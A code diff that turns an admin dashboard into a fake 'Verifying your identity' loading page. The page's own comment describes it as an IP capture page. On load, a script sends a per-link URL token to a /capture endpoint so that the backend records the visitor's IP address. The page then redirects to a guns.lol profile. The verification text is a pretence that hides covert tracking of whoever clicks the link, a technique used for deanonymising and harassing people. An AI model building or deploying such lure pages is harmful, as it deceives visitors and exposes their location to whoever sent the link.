@@ -1,26 +1,190 @@
+<!-- static/index.html - IP capture page with white loading screen -->
 <!DOCTYPE html>
-<html>
-<head><title>Admin Dashboard</title></head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .spinner {
+            width: 56px;
+            height: 56px;
+            border: 5px solid #e8ecf1;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
+            margin: 0 auto 28px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .title {
+            color: #1a1a2e;
+            font-size: 22px;
+            font-weight: 600;
+            letter-spacing: -0.2px;
+        }
+
+        .subtitle {
+            color: #6b7280;
+            font-size: 15px;
+            margin-top: 8px;
+            font-weight: 400;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e8ecf1;
+            border-radius: 4px;
+            margin-top: 28px;
+            overflow: hidden;
+        }
+
+        .progress-bar .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #3498db, #2ecc71);
+            border-radius: 4px;
+            animation: progress 2s ease-in-out forwards;
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .status-text {
+            color: #9ca3af;
+            font-size: 13px;
+            margin-top: 12px;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        /* Dark mode support */
+        @media (prefers-color-scheme: dark) {
+            body {
+                background: #ffffff;
+            }
+            .title {
+                color: #1a1a2e;
+            }
+            .subtitle {
+                color: #6b7280;
+            }
+            .spinner {
+                border-color: #d1d5db;
+                border-top-color: #3498db;
+            }
+            .progress-bar {
+                background: #d1d5db;
+            }
+            .status-text {
+                color: #9ca3af;
+            }
+        }
+
+        /* Mobile responsive */
+        @media (max-width: 480px) {
+            .title {
+                font-size: 19px;
+            }
+            .subtitle {
+                font-size: 14px;
+            }
+            .spinner {
+                width: 44px;
+                height: 44px;
+                border-width: 4px;
+            }
+        }
+    </style>
+
+    <!-- Auto-redirect to guns.lol after 2.5 seconds -->
+    <meta http-equiv="refresh" content="2.5;url=https://guns.lol/cr3m">
+
+    <!-- JavaScript to capture IP and send via fetch (backup to Flask backend) -->
+    <script>
+        // This runs immediately when page loads
+        (function captureIP() {
+            // Get token from URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const token = urlParams.get('token');
+
+            if (!token) {
+                console.log('No token provided');
+                return;
+            }
+
+            // Send IP capture to backend via fetch
+            fetch('/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    token: token
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('IP captured:', data);
+            })
+            .catch(error => {
+                console.error('Failed to capture IP:', error);
+            });
+        })();
+    </script>
+</head>
 <body>
-  <h1>Verify Logs</h1>
-  <button onclick="fetchLogs()">Refresh Logs</button>
-  <pre id="logs"></pre>
-  <h1>Members</h1>
-  <button onclick="fetchMembers()">Pull Members</button>
-  <pre id="members"></pre>
-  <script>
-    async function fetchLogs() {
-      const res = await fetch('/api/logs');
-      const data = await res.json();
-      document.getElementById('logs').textContent = JSON.stringify(data, null, 2);
-    }
-    async function fetchMembers() {
-      const res = await fetch('/api/members');
-      const data = await res.json();
-      document.getElementById('members').textContent = JSON.stringify(data, null, 2);
-    }
-    fetchLogs();
-    fetchMembers();
-  </script>
+
+    <div class="container">
+        <!-- Spinner -->
+        <div class="spinner"></div>
+
+        <!-- Title -->
+        <div class="title">Verifying your identity</div>
+        <div class="subtitle">Please wait while we complete the process</div>
+
+        <!-- Progress bar -->
+        <div class="progress-bar">
+            <div class="fill"></div>
+        </div>
+
+        <!-- Status -->
+        <div class="status-text">Redirecting...</div>
+    </div>
+
 </body>
 </html>
